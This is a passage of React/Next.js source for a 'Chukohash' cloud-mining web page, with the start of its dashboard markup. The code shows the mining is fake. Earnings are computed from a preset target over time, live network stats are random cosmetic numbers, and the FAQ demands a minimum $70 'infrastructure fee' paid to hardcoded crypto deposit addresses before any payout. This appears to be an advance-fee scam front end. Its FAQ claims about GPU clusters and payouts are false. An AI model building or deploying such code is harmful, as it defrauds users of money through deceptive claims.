"use client";

import React, { useState, useEffect, useRef, useMemo, useCallback, memo } from "react";
import { useMiningStore } from "./store/useMiningStore";
import { formatCrypto, formatUsd, formatTime, formatPercentage } from "./utils/formatting";
import { getTierVolatilityConfig } from "./config/volatility";
import { getTierHashrateConfig } from "./config/hashrate";
import { idleEstDisplay } from "./utils/volatilityEngine";
import { idleHashrateDisplay } from "./utils/hashrateEngine";
import { useVisualVolatility } from "./hooks/useVisualVolatility";
import { useHashrateEngine } from "./hooks/useHashrateEngine";
import { useLiveLog } from "./hooks/useLiveLog";
import { migrateLegacyStorage, flushPendingWrites } from "./storage/persistence";
import WithdrawalModal from "./components/WithdrawalModal";
import UnpaidBanner from "./components/UnpaidBanner";

// FAQ item component - Memoized to prevent parent re-render propagation
const FaqItem = memo(function FaqItem({ question, answer }: { question: string; answer: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className={`faq-item${open ? ' open' : ''}`} onClick={() => setOpen(!open)}>
      <div className="faq-q">
        <span>{question}</span>
        <span className="faq-arrow">+</span>
      </div>
      <div className="faq-a">{answer}</div>
    </div>
  );
});
FaqItem.displayName = "FaqItem";


// Coin data for the selector panel
const COINS = [
  { id: 'btc', name: 'Bitcoin', ticker: 'BTC', price: '$77,958', change: '+1.6%', up: true, icon: 'assets/bitcoin.svg' },
  { id: 'eth', name: 'Ethereum', ticker: 'ETH', price: '$2,143', change: '+1.4%', up: true, icon: 'assets/ethereum.jpeg' },
  { id: 'bnb', name: 'BNB', ticker: 'BNB', price: '$653.79', change: '+2.2%', up: true, icon: 'assets/bnb.jpeg' },
  { id: 'sol', name: 'Solana', ticker: 'SOL', price: '$86.96', change: '+3.2%', up: true },
  { id: 'ton', name: 'Toncoin', ticker: 'TON', price: '$2.06', change: '+5.9%', up: true },
  { id: 'xmr', name: 'Monero', ticker: 'XMR', price: '$403.86', change: '+2.4%', up: true },
  { id: 'doge', name: 'Dogecoin', ticker: 'DOGE', price: '$0.106', change: '+3.0%', up: true },
  { id: 'trx', name: 'TRON', ticker: 'TRX', price: '$0.359', change: '+1.2%', up: true },
  { id: 'ada', name: 'Cardano', ticker: 'ADA', price: '$0.251', change: '+1.1%', up: true },
  { id: 'dot', name: 'Polkadot', ticker: 'DOT', price: '$1.29', change: '+4.4%', up: true },
  { id: 'usdt', name: 'Tether', ticker: 'USDT', price: '$0.999', change: '+0.0%', up: true },
  { id: 'usdc', name: 'USD Coin', ticker: 'USDC', price: '$1.000', change: '-0.0%', up: false },
  { id: 'ltc', name: 'Litecoin', ticker: 'LTC', price: '$54.39', change: '+1.1%', up: true },
  { id: 'xrp', name: 'Ripple', ticker: 'XRP', price: '$1.38', change: '+1.5%', up: true },
];

const FAQ_ITEMS = [
  {
    q: 'How does cloud mining work on Chukohash?',
    a: 'Chukohash allocates GPU resources from our distributed datacenter clusters to your mining session. You select a cryptocurrency and cluster power level, and our infrastructure handles the rest. No hardware or software installation required — everything runs in the cloud.',
  },
  {
    q: "Does mining use my device's resources?",
    a: "No. Your phone, laptop, or PC is not used for any computational work. All mining is performed entirely on our remote datacenter GPU clusters. Your device simply displays the session dashboard — it won't heat up, slow down, or drain battery any more than browsing a regular website.",
  },
  {
    q: 'Why is there an infrastructure fee?',
    a: 'Mining requires significant computational power. The infrastructure fee covers GPU cluster operation costs, electricity, cooling, and network maintenance across our datacenters. The fee percentage varies based on the cluster power level you choose (8%–11%).',
  },
  {
    q: 'Is there a minimum fee?',
    a: 'Yes, the minimum infrastructure fee is $70. If your calculated fee based on the percentage is less than $70, the minimum applies. This covers the base cost of allocating cluster resources for your session.',
  },
  {
    q: 'Why do you store data only in localStorage?',
    a: "Privacy is our core principle. By storing all session data exclusively in your browser's localStorage, we ensure zero server-side tracking. No accounts, no KYC, no cookies, no analytics. You control your data completely — clear your browser storage and it's gone forever.",
  },
  {
    q: 'What happens if I close the browser during mining?',
    a: "Your session is automatically paused when the tab becomes inactive or the browser is minimized. When you return, the session resumes from where it left off. Your progress is saved locally, so you won't lose any mined earnings.",
  },
  {
    q: 'How long is a mining session?',
    a: 'Each mining session can run for up to 20 minutes. You can stop the session at any time before the limit. The session timer only counts active time — it pauses when you switch tabs or minimize the window.',
  },
  {
    q: 'What is a session code?',
    a: 'Each mining session is assigned a unique code (e.g. NX-A7K3-P9BW). This code identifies your session for payment processing. If you leave the site before paying the infrastructure fee, you can return later and use the session code to complete your withdrawal.',
  },
  {
    q: 'Which cryptocurrencies can I mine?',
    a: 'We support 10+ cryptocurrencies including Bitcoin (BTC), Ethereum (ETH), Solana (SOL), Toncoin (TON), Monero (XMR), Dogecoin (DOGE), TRON (TRX), Cardano (ADA), Polkadot (DOT), Tether (USDT), USD Coin (USDC), Litecoin (LTC), and Ripple (XRP).',
  },
  {
    q: 'How do I receive my mined crypto?',
    a: "After stopping your mining session, you'll be asked to enter your wallet address. Once you pay the infrastructure fee via deposit or WalletConnect, your mined earnings are automatically sent to your specified wallet within 2 network confirmations.",
  },
];

// Helper to parse price string (pure function, defined outside component)
const parseCoinPrice = (priceStr: string): number => {
  return parseFloat(priceStr.replace(/[^0-9.]/g, ''));
};

const COIN_NETWORKS: Record<string, string[]> = {
  btc: ["Bitcoin Network", "Lightning Network"],
  eth: ["ERC-20", "Arbitrum", "Optimism", "Base"],
  bnb: ["BSC (BEP-20)", "opBNB"],
  sol: ["Solana Network"],
  ton: ["TON Network"],
  trx: ["TRC-20"],
  usdt: ["TRC-20", "ERC-20", "BEP-20", "SOLANA"],
  usdc: ["ERC-20", "SOLANA", "BEP-20"]
};

const DEPOSIT_ADDRESSES: Record<string, string> = {
  btc: "bc1qagvkz7ad8uqp62hwd5pztgxv82zan3wcjr2ft4",
  eth: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
  bnb: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
  sol: "3vwAi8FEGcerD4yfQHBFFKx4FvRzPDNMGeVRZe3qoEzj",
  ton: "UQDnHAIjBPfEpksvRCWKU0P3KTxwOYrmKubD4078XORCetRm",
  trx: "TNaZbM2KpomzDT9PRufvyRcFH1EBtTmgCo",
  xmr: "3vwAi8FEGcerD4yfQHBFFKx4FvRzPDNMGeVRZe3qoEzj",
  ltc: "ltc1qcexcxae3evs8rt7ctz6vdnwwllsz39aqwrc3ee",
  xrp: "rhJwTZNi8j6E7WrkuqPrUtEw3usRXhXD6L",
  usdt: "TNaZbM2KpomzDT9PRufvyRcFH1EBtTmgCo",
  usdc: "0x169C339370E67C03e84787d8eC402dd89d94b51D"
};

export default function Home() {
  // Real-time ticking statistics for high-yield feel (cosmetic background stats) stored as refs to prevent React re-renders
  const nodesRef = useRef(17796);
  const hashRef = useRef(893.4);
  const onlineRef = useRef(5954);
  const lastTextWriteRef = useRef<number>(0);
  /** Optimistic control — flips on click before store subscribers re-render. */
  const [miningButtonActive, setMiningButtonActive] = useState(false);
  const [isCoinListExpanded, setIsCoinListExpanded] = useState(false);

  // --- WITHDRAWAL MODAL STATES ---
  // Managed centrally in useMiningStore to avoid dashboard repaint storms
  // --- END WITHDRAWAL MODAL STATES ---

  // Zustand Store Hooks (using selectors to prevent unnecessary re-renders)
  const isMining = useMiningStore((s) => s.isMining);
  const selectedCoin = useMiningStore((s) => s.selectedCoin);
  const speedTier = useMiningStore((s) => s.speedTier);
  const currentSession = useMiningStore((s) => s.currentSession);
  const history = useMiningStore((s) => s.history);

  const setSelectedCoin = useMiningStore((s) => s.setSelectedCoin);
  const setSpeedTier = useMiningStore((s) => s.setSpeedTier);
  const startMining = useMiningStore((s) => s.startMining);
  const stopMining = useMiningStore((s) => s.stopMining);
  const restoreSession = useMiningStore((s) => s.restoreSession);
  const clearHistory = useMiningStore((s) => s.clearHistory);
  const animationFrameIdRef = useRef<number | null>(null);
  /** Sync guard so loops halt immediately on stop, before React re-renders. */
  const isMiningLiveRef = useRef(false);
  const lastProcessedSecondRef = useRef<number>(-1);
  const stepVolatilityRef = useRef<(elapsedSeconds: number) => void>(() => { });
  const stepHashrateRef = useRef<(elapsedSeconds: number) => void>(() => { });
  const displayCoinRef = useRef<number>(0);
  const displayUsdRef = useRef<number>(0);

  // Lock coin & speed selectors while a session is actively running
  const sessionLocked = miningButtonActive && !!currentSession;
  const activeCoin = sessionLocked ? currentSession!.selectedCoin : selectedCoin;
  const activeSpeed = sessionLocked ? currentSession!.speedTier : speedTier;

  // DOM Refs for high-performance direct manipulation (bypasses React render overhead at 60 FPS)
  const minedAmountRef = useRef<HTMLSpanElement>(null);
  const minedUsdRef = useRef<HTMLDivElement>(null);
  const sessionTimeRef = useRef<HTMLDivElement>(null);
  const progressFillRef = useRef<HTMLDivElement>(null);
  const progressPctRef = useRef<HTMLSpanElement>(null);

  // Visual volatility DOM refs (display-only; separate from payout engine)
  const hashrateRef = useRef<HTMLDivElement>(null);
  const hashrateUnitRef = useRef<HTMLDivElement>(null);
  const estEarningsRef = useRef<HTMLDivElement>(null);
  const estUsdRef = useRef<HTMLDivElement>(null);
  const liveLogRef = useRef<HTMLDivElement>(null);

  // --- WITHDRAWAL MODAL HELPERS ---
  // Managed inside isolated components to prevent main page layout thrashing
  // --- END WITHDRAWAL MODAL HELPERS ---

  const resetMiningDisplay = useCallback((coinId: string) => {
    const coinTicker =
      COINS.find((c) => c.id === coinId)?.ticker || coinId.toUpperCase();

    displayCoinRef.current = 0;
    displayUsdRef.current = 0;
    lastTextWriteRef.current = 0;

    if (minedAmountRef.current) {
      minedAmountRef.current.textContent = "0.00000000";
    }
    const tickerEl = document.getElementById("minedTicker");
    if (tickerEl) {
      tickerEl.textContent = coinTicker;
    }
    if (minedUsdRef.current) {
      minedUsdRef.current.textContent = formatUsd(0);
    }
    if (sessionTimeRef.current) {
      sessionTimeRef.current.textContent = formatTime(0);
    }
    if (progressFillRef.current) {
      progressFillRef.current.style.transform = "scaleX(0)";
    }
    if (progressPctRef.current) {
      progressPctRef.current.textContent = formatPercentage(0);
    }
  }, []);

  // Restore session on mount
  useEffect(() => {
    migrateLegacyStorage();
    restoreSession();
    const onUnload = () => flushPendingWrites();
    window.addEventListener("beforeunload", onUnload);
    return () => window.removeEventListener("beforeunload", onUnload);
  }, [restoreSession]);

  useEffect(() => {
    setMiningButtonActive(isMining);
  }, [isMining]);

  // Subtle cosmetic background network fluctuations using direct DOM manipulation (zero React re-renders)
  useEffect(() => {
    const updateStatsDom = () => {
      const elNodes = document.getElementById("statNodes");
      const elHash = document.getElementById("statHash");
      const elOnline = document.getElementById("statOnline");
      if (elNodes) elNodes.textContent = nodesRef.current.toLocaleString();
      if (elHash) elHash.textContent = `${hashRef.current.toFixed(0)} PH/s`;
      if (elOnline) elOnline.textContent = onlineRef.current.toLocaleString();
    };

    // Initialize DOM with current ref values
    updateStatsDom();

    const interval = setInterval(() => {
      nodesRef.current += (Math.random() > 0.5 ? 1 : -1);
      hashRef.current = +(hashRef.current + (Math.random() - 0.5) * 0.4).toFixed(1);
      onlineRef.current += (Math.random() > 0.52 ? 1 : -1);
      updateStatsDom();
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  // requestAnimationFrame core render loop
  useEffect(() => {
    animationFrameIdRef.current = null;

    const tick = () => {
      const coinTicker = COINS.find((c) => c.id === activeCoin)?.ticker || activeCoin.toUpperCase();

      if (!isMiningLiveRef.current || !isMining || !currentSession) {
        resetMiningDisplay(activeCoin);
        return;
      }

      const elapsedMs = Date.now() - currentSession.startTimestamp;
      const progress = Math.min(Math.max(elapsedMs / currentSession.durationMs, 0), 1);

      const currentUsd = currentSession.targetUsd * progress;
      const currentCoin = currentUsd / currentSession.baseCoinPrice;

      // Format elapsed time string (HH:MM:SS) using formatting utility
      const timeStr = formatTime(elapsedMs);

      // --- VISUAL INTERPOLATION (LOW-PASS FILTERING) ---
      // Detect if we just started/restored a session to prevent crazy initial spin-ups.
      if (displayCoinRef.current === 0 && currentCoin > 0) {
        displayCoinRef.current = currentCoin;
      }
      if (displayUsdRef.current === 0 && currentUsd > 0) {
        displayUsdRef.current = currentUsd;
      }

      // Smooth easing (low-pass filter) catch-up motion toward real values
      const alpha = 0.02; // Heavily damped for premium Bloomberg-style feel
      displayCoinRef.current += (currentCoin - displayCoinRef.current) * alpha;
      displayUsdRef.current += (currentUsd - displayUsdRef.current) * alpha;

      // Force absolute mathematical precision when session is complete
      if (progress >= 1) {
        displayCoinRef.current = currentCoin;
        displayUsdRef.current = currentUsd;
      }

      // Directly manipulate DOM elements (60 FPS for structural progress, throttled 20Hz for numeric noise reduction)
      const now = Date.now();
      const shouldWriteText = now - lastTextWriteRef.current >= 50 || progress >= 1;

      if (shouldWriteText) {
        const cryptoStr = displayCoinRef.current.toFixed(8);
        if (minedAmountRef.current && minedAmountRef.current.textContent !== cryptoStr) {
          minedAmountRef.current.textContent = cryptoStr;
        }
        const usdStr = formatUsd(displayUsdRef.current);
        if (minedUsdRef.current && minedUsdRef.current.textContent !== usdStr) {
          minedUsdRef.current.textContent = usdStr;
        }
        const tickerEl = document.getElementById("minedTicker");
        if (tickerEl && tickerEl.textContent !== coinTicker) {
          tickerEl.textContent = coinTicker;
        }
        lastTextWriteRef.current = now;
      }

      // Only write to session timer DOM when the time string changes (1Hz cadence) to avoid 60 FPS repaint overhead
      if (sessionTimeRef.current) {
        const currentVal = sessionTimeRef.current.textContent;
        if (currentVal !== timeStr) {
          sessionTimeRef.current.textContent = timeStr;
        }
      }
      // Transform progress bar (promoted to compositor layer via will-change: transform)
      if (progressFillRef.current) {
        progressFillRef.current.style.transform = `scaleX(${progress})`;
      }
      // Only write to progress percentage DOM when the percentage changes to avoid 60 FPS repaint overhead
      const pctStr = formatPercentage(progress);
      if (progressPctRef.current) {
        const currentPct = progressPctRef.current.textContent;
        if (currentPct !== pctStr) {
          progressPctRef.current.textContent = pctStr;
        }
      }

      // --- STRICT SYNCHRONIZED VOLATILITY HEARTBEAT ---
      const elapsedSeconds = Math.floor(elapsedMs / 1000);
      if (elapsedSeconds !== lastProcessedSecondRef.current) {
        if (stepHashrateRef.current) stepHashrateRef.current(elapsedSeconds);
        if (stepVolatilityRef.current) stepVolatilityRef.current(elapsedSeconds);
        lastProcessedSecondRef.current = elapsedSeconds;
      }
      // ------------------------------------------------

      if (progress >= 1) {
        isMiningLiveRef.current = false;

        // Capture session details for automatic withdrawal modal pop-up!
        const coinData = COINS.find((c) => c.id === currentSession.selectedCoin) || COINS[0];

        useMiningStore.getState().openWithdrawalModal({
          sessionId: currentSession.sessionId,
          coinId: currentSession.selectedCoin,
          coinName: coinData.name,
          coinTicker: coinData.ticker,
          minedAmount: currentSession.targetUsd / currentSession.baseCoinPrice,
          minedUsd: currentSession.targetUsd,
          speedTier: currentSession.speedTier
        });

        stopMining(true);
      } else {
        animationFrameIdRef.current = requestAnimationFrame(tick);
      }
    };

    isMiningLiveRef.current = !!(isMining && currentSession);

    if (isMiningLiveRef.current) {
      animationFrameIdRef.current = requestAnimationFrame(tick);
    } else {
      tick();
    }

    return () => {
      if (animationFrameIdRef.current) {
        cancelAnimationFrame(animationFrameIdRef.current);
        animationFrameIdRef.current = null;
      }
    };
  }, [isMining, currentSession, activeCoin, stopMining]);

  // selectors locked to active session parameters or defaults (declared above loop)

  // Selected coin metadata
  const currentCoinData = COINS.find((c) => c.id === activeCoin) || COINS[0];
  const coinPriceNum = parseCoinPrice(currentCoinData.price);

  const idleEst = useMemo(
    () => idleEstDisplay(getTierVolatilityConfig(activeSpeed), coinPriceNum),
    [activeSpeed, coinPriceNum]
  );

  const idleHashrate = useMemo(
    () => idleHashrateDisplay(getTierHashrateConfig(activeSpeed)),
    [activeSpeed]
  );

  const { stopImmediately: stopVolatilityImmediately, step: stepVolatility } = useVisualVolatility({
    isActive: sessionLocked,
    speedTier: activeSpeed,
    coinPrice: coinPriceNum,
    refs: {
      estEarnings: estEarningsRef,
      estUsd: estUsdRef,
    },
  });

  const { stopImmediately: stopHashrateImmediately, step: stepHashrate } = useHashrateEngine({
    isActive: sessionLocked,
    speedTier: activeSpeed,
    refs: {
      hashrate: hashrateRef,
      hashrateUnit: hashrateUnitRef,
    },
  });

  stepVolatilityRef.current = stepVolatility;
  stepHashrateRef.current = stepHashrate;

  useLiveLog({
    containerRef: liveLogRef,
    isActive: sessionLocked,
    speedTier: activeSpeed,
  });

  // Start / Stop mining action handler (memoized stable reference)
  const handleMineBtnClick = useCallback(() => {
    // Always read fresh state directly from the store to avoid stale closure bugs
    const { isMining: freshIsMining, currentSession: freshSession, selectedCoin: freshCoin } = useMiningStore.getState();

    if (freshIsMining || miningButtonActive) {
      setMiningButtonActive(false);
      isMiningLiveRef.current = false;
      if (animationFrameIdRef.current) {
        cancelAnimationFrame(animationFrameIdRef.current);
        animationFrameIdRef.current = null;
      }
      const coinId = freshSession?.selectedCoin ?? freshCoin ?? selectedCoin;
      stopVolatilityImmediately();
      stopHashrateImmediately();

      // Capture active session details for withdrawal modal before stopping!
      if (freshSession) {
        const completedAt = Date.now();
        const elapsedMs = completedAt - freshSession.startTimestamp;
        const progress = Math.min(Math.max(elapsedMs / freshSession.durationMs, 0), 1);
        const minedUsd = freshSession.targetUsd * progress;
        const minedCoin = minedUsd / freshSession.baseCoinPrice;

        const coinData = COINS.find((c) => c.id === freshSession.selectedCoin) || COINS[0];

        useMiningStore.getState().openWithdrawalModal({
          sessionId: freshSession.sessionId,
          coinId: freshSession.selectedCoin,
          coinName: coinData.name,
          coinTicker: coinData.ticker,
          minedAmount: minedCoin,
          minedUsd: minedUsd,
          speedTier: freshSession.speedTier
        });
      }

      resetMiningDisplay(coinId);
      stopMining(true);
    } else {
      setMiningButtonActive(true);
      isMiningLiveRef.current = true;
      lastProcessedSecondRef.current = -1; // reset master clock tracker!
      const price = parseCoinPrice(COINS.find((c) => c.id === selectedCoin)?.price || "0");
      startMining(price);
    }
  }, [
    miningButtonActive,
    selectedCoin,
    stopVolatilityImmediately,
    stopHashrateImmediately,
    resetMiningDisplay,
    stopMining,
    startMining,
  ]);

  return (
    <>
      {/* ─── HERO SECTION ─── */}
      <section className="hero">
        <div className="container">
          <div className="hero-content">
            {/* HERO LOGO (mobile: above text, desktop: right side) */}
            <div className="hero-logo-mobile">
              <div className="hero-logo" id="heroLogo">
                <div className="hero-logo-ring r1"></div>
                <div className="hero-logo-ring r2"></div>
                <div className="hero-logo-core">
                  <div className="logo-svg">
                    <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
                      {/* Hexagonal mining chip design */}
                      <defs>
                        <linearGradient id="lg1" x1="0%" y1="0%" x2="100%" y2="100%">
                          <stop offset="0%" stopColor="#EC7505"></stop>
                          <stop offset="100%" stopColor="#ffae19"></stop>
                        </linearGradient>
                        <linearGradient id="lg2" x1="100%" y1="0%" x2="0%" y2="100%">
                          <stop offset="0%" stopColor="#EC7505" stopOpacity="0.3"></stop>
                          <stop offset="100%" stopColor="#ffae19" stopOpacity="0.3"></stop>
                        </linearGradient>
                      </defs>
                      {/* Outer hexagon */}
                      <polygon
                        points="100,15 175,55 175,135 100,175 25,135 25,55"
                        stroke="url(#lg2)"
                        strokeWidth="1.5"
                        fill="none"
                      ></polygon>
                      {/* Inner hexagon */}
                      <polygon
                        points="100,35 155,65 155,125 100,155 45,125 45,65"
                        stroke="url(#lg1)"
                        strokeWidth="2"
                        fill="rgba(236,117,5,0.03)"
                      ></polygon>
                      {/* Circuit lines */}
                      <line x1="100" y1="35" x2="100" y2="15" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      <line x1="155" y1="65" x2="175" y2="55" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      <line x1="155" y1="125" x2="175" y2="135" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      <line x1="100" y1="155" x2="100" y2="175" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      <line x1="45" y1="125" x2="25" y2="135" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      <line x1="45" y1="65" x2="25" y2="55" stroke="url(#lg1)" strokeWidth="1" opacity="0.5"></line>
                      {/* Center chip icon */}
                      <rect
                        x="75"
                        y="72"
                        width="50"
                        height="50"
                        rx="6"
                        stroke="url(#lg1)"
                        strokeWidth="2"
                        fill="rgba(236,117,5,0.06)"
                      ></rect>
                      {/* Chip pins */}
                      <line x1="85" y1="72" x2="85" y2="62" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="100" y1="72" x2="100" y2="62" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="115" y1="72" x2="115" y2="62" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="85" y1="122" x2="85" y2="132" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="100" y1="122" x2="100" y2="132" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="115" y1="122" x2="115" y2="132" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="75" y1="82" x2="65" y2="82" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="75" y1="97" x2="65" y2="97" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="75" y1="112" x2="65" y2="112" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="125" y1="82" x2="135" y2="82" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="125" y1="97" x2="135" y2="97" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      <line x1="125" y1="112" x2="135" y2="112" stroke="var(--accent)" strokeWidth="1.5" opacity="0.6"></line>
                      {/* CH (Chuckohash) text logo */}
                      <text
                        x="100"
                        y="103"
                        textAnchor="middle"
                        fontFamily="Orbitron"
                        fontSize="18"
                        fontWeight="900"
                        fill="url(#lg1)"
                      >
                        CH
                      </text>
                    </svg>
                  </div>
                </div>
                {/* Orbiting coins */}
                <div
                  className="orbit-coin"
                  style={{
                    left: "50%",
                    top: "50%",
                    transform: "translate(-50%, -50%)",
                    animation: "18s linear 0s infinite normal none running orbit-0",
                  }}
                >
                  <img
                    src="assets/icons/btc.svg"
                    alt="BTC"
                    onError={(e) => {
                      (e.currentTarget.parentElement as HTMLElement).style.display = "none";
                    }}
                  />
                </div>
                <div
                  className="orbit-coin"
                  style={{
                    left: "50%",
                    top: "50%",
                    transform: "translate(-50%, -50%)",
                    animation: "22s linear 0s infinite normal none running orbit-1",
                  }}
                >
                  <img
                    src="assets/icons/eth.svg"
                    alt="ETH"
                    onError={(e) => {
                      (e.currentTarget.parentElement as HTMLElement).style.display = "none";
                    }}
                  />
                </div>
                <div
                  className="orbit-coin"
                  style={{
                    left: "50%",
                    top: "50%",
                    transform: "translate(-50%, -50%)",
                    animation: "26s linear 0s infinite normal none running orbit-2",
                  }}
                >
                  <img
                    src="assets/icons/bnb.svg"
                    alt="BNB"
                    onError={(e) => {
                      (e.currentTarget.parentElement as HTMLElement).style.display = "none";
                    }}
                  />
                </div>
                <div
                  className="orbit-coin"
                  style={{
                    left: "50%",
                    top: "50%",
                    transform: "translate(-50%, -50%)",
                    animation: "30s linear 0s infinite normal none running orbit-3",
                  }}
                >
                  <img
                    src="assets/icons/sol.svg"
                    alt="SOL"
                    onError={(e) => {
                      (e.currentTarget.parentElement as HTMLElement).style.display = "none";
                    }}
                  />
                </div>
                <div
                  className="orbit-coin"
                  style={{
                    left: "50%",
                    top: "50%",
                    transform: "translate(-50%, -50%)",
                    animation: "34s linear 0s infinite normal none running orbit-4",
                  }}
                >
                  <img
                    src="assets/icons/doge.svg"
                    alt="DOGE"
                    onError={(e) => {
                      (e.currentTarget.parentElement as HTMLElement).style.display = "none";
                    }}
                  />
                </div>
              </div>
            </div>
            {/* /hero-logo-mobile */}

            <div className="hero-text">
              <div className="hero-badge">
                <span className="dot"></span> CLUSTER NODES ONLINE
              </div>
              <h1>
                Harness <span className="gradient">Datacenter Power</span> For Cloud Mining
              </h1>
              <p>
                Deploy GPU-accelerated mining across distributed datacenter clusters. No hardware. Session-based
                privacy-first architecture with zero tracking.
              </p>
              <div className="hero-actions">
                <a href="#mining" className="btn btn-primary">
                  Launch Miner
                </a>
                <a href="#howto" className="btn btn-outline">
                  How It Works
                </a>
              </div>
              <div className="hero-floats">
                <div className="hf-item">
                  <span className="hf-lbl">Active Nodes</span>
                  <span className="hf-val" id="statNodes">
                    17,796
                  </span>
                </div>
                <div className="hf-item">
                  <span className="hf-lbl">Hash Power</span>
                  <span className="hf-val" id="statHash">
                    893 PH/s
                  </span>
                </div>
                <div className="hf-item">
                  <span className="hf-lbl">Online</span>
                  <span className="hf-val" id="statOnline">
                    5,954
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* STATS BAR */}
          <div className="stats-bar fade-up visible">
            <div className="stat-item">
              <div className="stat-val">10+</div>
              <div className="stat-label">Cryptocurrencies</div>
            </div>
            <div className="stat-item">
              <div className="stat-val">99.9%</div>
              <div className="stat-label">Uptime</div>
            </div>
            <div className="stat-item">
              <div className="stat-val">0%</div>
              <div className="stat-label">Data Collection</div>
            </div>
            <div className="stat-item">
              <div className="stat-val">24/7</div>
              <div className="stat-label">Cluster Access</div>
            </div>
          </div>
        </div>
      </section>

      {/* ─── MINING DASHBOARD SECTION ─── */}
      <section id="mining" className="mining-section">
        <div className="container">
          <div className="section-header fade-up visible">
            <span className="section-tag">// Mining Dashboard</span>
            <h2 className="section-title">Deploy Your Mining Session</h2>
          </div>

          <div className="dashboard-grid">
            {/* Coin Selector Panel */}
            <div className="coin-panel">
              <h3>Select Cryptocurrency</h3>
              <style>{`
                .coin-scroll {
                  display: grid;
                  grid-template-columns: repeat(3, 1fr);
                  gap: 8px;
                  margin-bottom: 12px;
                }
                .coin-chip {
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  gap: 6px;
                  background: var(--glass);
                  border: 1px solid var(--border);
                  border-radius: var(--r);
                  padding: 12px 8px;
                  cursor: pointer;
                  transition: 0.2s;
                  text-align: center;
                }
                .coin-chip:hover {
                  background: rgba(255,255,255,0.05);
                }
                .coin-chip.active {
                  background: var(--accent-dim);
                  border-color: var(--accent);
                }
                .coin-chip img {
                  width: 28px;
                  height: 28px;
                }
                .cc-info {
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                }
                .cc-name {
                  font-weight: 600;
                  font-size: 14px;
                  line-height: 1.2;
                }
                .cc-price {
                  font-size: 12px;
                  color: var(--text-secondary);
                  line-height: 1.2;
                }
                .expand-coins {
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                  width: 100%;
                  background: transparent;
                  border: 1px dashed var(--border);
                  border-radius: var(--r);
                  padding: 10px;
                  color: var(--text-secondary);
                  font-size: 14px;
                  cursor: pointer;
                  margin-bottom: 16px;
                  transition: 0.2s;
                }
                .expand-coins:hover {
                  color: var(--text-primary);
                  border-color: var(--border-hover);
                  background: var(--glass);
                }
                .coin-list-full {
                  display: none;
                }
                .coin-list-full.expanded {
                  display: block;
                }
              `}</style>

              {/* Horizontal scroll for mobile */}
              <div className="coin-scroll" id="coinScroll">
                {COINS.slice(0, 3).map((coin) => (
                  <div
                    key={'chip-' + coin.id}
                    className={`coin-chip ${activeCoin === coin.id ? 'active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSelectedCoin(coin.id);
                    }}
                  >
                    <img
                      src={coin.icon || `assets/icons/${coin.id}.svg`}
                      alt={coin.ticker}
                      onError={(e) => { e.currentTarget.style.display = 'none'; }}
                    />
                    <div className="cc-info">
                      <div className="cc-name">{coin.ticker}</div>
                      <div className="cc-price">{coin.price}</div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Expand button for mobile */}
              <button
                className="expand-coins"
                id="expandCoins"
                onClick={() => setIsCoinListExpanded(!isCoinListExpanded)}
              >
                <span id="expandText">{isCoinListExpanded ? 'Hide Coins' : 'Show All Coins'}</span>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ transform: isCoinListExpanded ? 'rotate(180deg)' : 'none', transition: '0.3s' }}>
                  <path d="M6 9l6 6 6-6"></path>
                </svg>
              </button>

              {/* Full list (visible on desktop, collapsible on mobile) */}
              <div className={`coin-list-full ${isCoinListExpanded ? 'expanded' : ''}`} id="coinListFull">
                {COINS.map((coin) => (
                  <div
                    key={coin.id}
                    className={`coin-item${activeCoin === coin.id ? ' active' : ''}`}
                    onClick={() => {
                      if (miningButtonActive) return;
                      setSelectedCoin(coin.id);
                    }}
                  >
                    <img
                      src={coin.icon || `assets/icons/${coin.id}.svg`}
                      alt={coin.ticker}
                      onError={(e) => { e.currentTarget.style.display = 'none'; }}
                    />
                    <div className="coin-info">
                      <div className="coin-name">{coin.name}</div>
                      <div className="coin-ticker">{coin.ticker} · {coin.price}</div>
                    </div>
                    <div className="coin-rate">
                      <span className={coin.up ? 'price-up' : 'price-down'}>{coin.change}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Mining Display Panel */}
            <div className="mine-display" id="mineDisplay">
              <div className="hashrate-display">
                <div className="hashrate-label">Mined</div>
                <div style={{ display: 'inline-flex', alignItems: 'baseline', justifyContent: 'center' }}>
                  <span className="hashrate-value" id="minedAmount" ref={minedAmountRef}>0.00000000</span>
                  <span className="hashrate-unit" id="minedTicker">BTC</span>
                </div>
                <div className="mined-usd-main" id="minedUsd" ref={minedUsdRef}>$0.00</div>
              </div>

              <div className="mine-metrics">
                <div className="metric-box">
                  <div className="label">Hashrate</div>
                  <div
                    className="value volatility-metric"
                    id="hashrate"
                    ref={hashrateRef}
                    suppressHydrationWarning
                  >
